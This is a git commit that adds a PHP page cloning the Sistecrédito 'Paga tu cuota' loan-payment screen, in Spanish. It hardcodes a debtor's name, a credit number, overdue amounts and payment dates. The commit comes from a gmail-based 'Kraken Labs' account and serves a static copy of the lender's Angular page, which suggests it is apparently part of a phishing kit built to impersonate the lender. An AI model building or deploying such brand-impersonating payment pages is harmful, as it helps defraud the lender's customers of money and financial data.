2acc17c7a02567df0567756a65cf284406b9059e
Kraken Labs <krakenanalytics2@gmail.com>
2026-08-13 16:44:06 -0300

    Deploy: pagina payment-detail

---
+++ people/payment-detail/index.php
@@ -0,0 +1,33 @@
+<?php
+require_once __DIR__ . '/../../config.php';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="title" content="Sistecrédito - Paga tu cuota">
+<meta name="description" content="Consulta y paga las cuotas de tus créditos fácil, rápido y seguro con Sistecrédito">
+<title id="pageTitle">Sistecrédito - Paga tu cuota</title>
+<link rel="stylesheet" href="../../assets/css/styles-inline-payment-detail.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-J73ZU62S.css" media="all">
+<link rel="stylesheet" href="../../assets/css/styles-components-payment-detail.css" media="all">
+
+</head>
+<body>
+<app-root><sc-loading customtext=""></sc-loading><router-outlet></router-outlet><sc-new-payment-detail><form novalidate="" class="ng-untouched ng-pristine ng-valid"><sc-new-payment-detail-people-template><div class="payment-detail"><div class="payment-detail__greeting"><div> Hola, <span class="name"><b>Gustavo</b></span></div><div><b>Selecciona el crédito que deseas pagar</b></div></div><div class="payment-detail__credits"><sc-credits-list><div class="credits-list"><div class="credits-list__header"><div class="summary"><span>Estado del crédito:</span><div class="summary__status"><div class="status-item"><sc-icon iconname="faCircle" iconsize="s"><fa-icon size="4x" class="ng-fa-icon icon-size icon-size--s" style="color: rgb(207, 51, 57);"><svg data-prefix="fas" data-icon="circle" class="svg-inline--fa fa-circle fa-4x fa-pull-undefined" role="img" viewBox="0 0 512 512" aria-hidden="true"><path fill="currentColor" d="M0 256a256 256 0 1 1 512 0 256 256 0 1 1 -512 0z"></path></svg></fa-icon></sc-icon><span>En mora: 1</span></div><div class="status-item"><sc-icon iconname="faCircle" iconsize="s"><fa-icon size="4x" class="ng-fa-icon icon-size icon-size--s" style="color: rgb(0, 54, 156);"><svg data-prefix="fas" data-icon="circle" class="svg-inline--fa fa-circle fa-4x fa-pull-undefined" role="img" viewBox="0 0 512 512" aria-hidden="true"><path fill="currentColor" d="M0 256a256 256 0 1 1 512 0 256 256 0 1 1 -512 0z"></path></svg></fa-icon></sc-icon><span>Al día: 0</span></div></div></div><sc-checkbox class="ng-untouched ng-pristine ng-valid"><div class="checkbox hover-enabled" style="align-items: center;"><div class="checkbox__slot"><input type="checkbox" class="checkbox__input input-enabled readonly ng-untouched ng-pristine ng-valid" id=""></div><div class="checkbox__text"> Selecciona todos los créditos <b>(1)</b></div></div></sc-checkbox></div><div class="credits-list__credits"><sc-credit><div class="credit-desktop"><sc-credit-desktop><div class="credit credit-selected"><div class="credit-desktop__row-0"><div class="sc-col col12 col-md12 col-lg2"><sc-checkbox class="ng-untouched ng-pristine ng-valid"><div class="checkbox hover-enabled" style="align-items: center;"><div class="checkbox__slot"><input type="checkbox" class="checkbox__input input-enabled readonly ng-untouched ng-pristine ng-valid" id=""></div></div></sc-checkbox></div><div class="sc-col col12 col-md12 col-lg2"><div class="number">6010019590</div></div><div class="sc-col col12 col-md12 col-lg3"><div class="credit--status credit--status-mora">En mora</div></div><div class="sc-col col12 col-md12 col-lg2"><div class="amount">$662.997</div></div><div class="sc-col col12 col-md12 col-lg3"><div class="capital">Saldo capital: <strong>$494.643</strong></div></div></div><div class="credit-desktop__separator"></div><div class="credit-desktop__row-1"><div class="sc-col col12 col-md12 col-lg2 credit-desktop__label-cuota">Cuota: <strong>$83.500</strong></div><div class="sc-col col12 col-md12 col-lg3">Próximo pago: <strong>23/07/2026</strong></div><div class="sc-col col12 col-md12 col-lg3">Días de mora: <strong>13</strong></div></div></div></sc-credit-desktop></div></sc-credit></div></div></sc-credits-list></div></div></sc-new-payment-detail-people-template></form></sc-new-payment-detail></app-root>
+  
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+ 
+<div id="ZN_5hU8A0WekgPOmyO"></div>
+ 
+
+<div id="qservus-widget-container"></div>
+
+<script src="../../assets/js/app.js" defer></script>
+</body>
+</html>
